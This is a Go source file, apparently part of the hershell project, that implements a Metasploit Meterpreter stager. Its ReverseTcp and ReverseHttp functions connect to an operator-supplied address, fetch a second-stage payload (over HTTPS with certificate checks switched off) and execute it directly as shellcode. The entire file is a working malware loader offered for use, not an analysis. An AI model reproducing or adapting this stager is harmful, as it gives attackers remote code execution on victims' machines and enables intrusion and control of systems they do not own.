package meterpreter

import (
	"crypto/tls"
	"encoding/binary"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"time"

	"github.com/lesnuages/hershell/shell"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

func Meterpreter(connType, address string) (bool, error) {
	var (
		ok  bool
		err error
	)
	switch {
	case connType == "http" || connType == "https":
		ok, err = ReverseHttp(connType, address)
	case connType == "tcp":
		ok, err = ReverseTcp(address)
	default:
		ok = false
	}

	return ok, err
}

func GetRandomString(length int, charset string) string {
	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	buf := make([]byte, length)
	for i := range buf {
		buf[i] = charset[seed.Intn(len(charset))]
	}
	return string(buf)
}

// See https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb
func GetURIChecksumId() int {
	var res int = 0
	switch runtime.GOOS {
	case "windows":
		res = 92
	case "linux":
		res = 95
	default:
		res = 92
	}
	return res
}

func GenerateURIChecksum(length int) string {
	for {
		var checksum int = 0
		var uriString string

		uriString = GetRandomString(length, charset)
		for _, value := range uriString {
			checksum += int(value)
		}
		if (checksum % 0x100) == GetURIChecksumId() {
			return uriString
		}
	}
}

func ReverseTcp(address string) (bool, error) {
	var (
		stage2LengthBuf []byte = make([]byte, 4)
		tmpBuf          []byte = make([]byte, 2048)
		read            int    = 0
		totalRead       int    = 0
		stage2LengthInt uint32 = 0
		conn            net.Conn
		err             error
	)

	if conn, err = net.Dial("tcp", address); err != nil {
		return false, err
	}

	defer conn.Close()

	if _, err = conn.Read(stage2LengthBuf); err != nil {
		return false, err
	}

	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
	stage2Buf := make([]byte, stage2LengthInt)

	for totalRead < (int)(stage2LengthInt) {
		if read, err = conn.Read(tmpBuf); err != nil {
			return false, err
		}
		totalRead += read
		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
	}

	shell.ExecShellcode(stage2Buf)

	return true, nil
}

func ReverseHttp(connType, address string) (bool, error) {
	var (
		resp *http.Response
		err  error
	)
	url := connType + "://" + address + "/" + GenerateURIChecksum(12)
	if connType == "https" {
		transport := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: transport}
		resp, err = client.Get(url)
	} else {
		resp, err = http.Get(url)
	}
	if err != nil {
		return false, err
	}

	defer resp.Body.Close()

	stage2buf, _ := ioutil.ReadAll(resp.Body)
	shell.ExecShellcode(stage2buf)

	return true, nil
}
